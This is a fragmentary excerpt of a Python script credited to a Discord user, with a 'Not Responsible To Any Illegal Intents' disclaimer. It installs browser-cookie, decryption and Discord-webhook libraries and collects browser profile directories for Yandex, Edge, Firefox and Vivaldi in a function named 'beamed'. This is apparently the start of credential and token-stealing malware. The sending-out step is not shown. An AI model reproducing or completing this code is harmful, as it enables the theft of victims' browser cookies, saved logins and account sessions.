...
# REQUIREMENT INSTALL
print("Installing...")
print("Please Note Python3 Is Required To Install This Script")
os.system ("pip3 install psutil requests browser_cookie3 termcolor dhooks cryptography pycryptodome colored")
# MENU
print("""{0}
...
{1}""".format(fg('green'), attr(0)))
print("{0}Made By ~Ahmad~#0001{1}".format(fg('blue'), attr(0)))
print ('Not Responsible To Any Illegal Intents')
print ('https://discord.gg/accounts')
print ("Loading...")
...
Directories = {
        ...
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default','Edge': roaming + '\\Microsoft\\Edge\\User Data\\Default',
        'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles\\',
        'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\'
    }
...
def beamed():
    ...
    paths = {
        ...
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default','Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
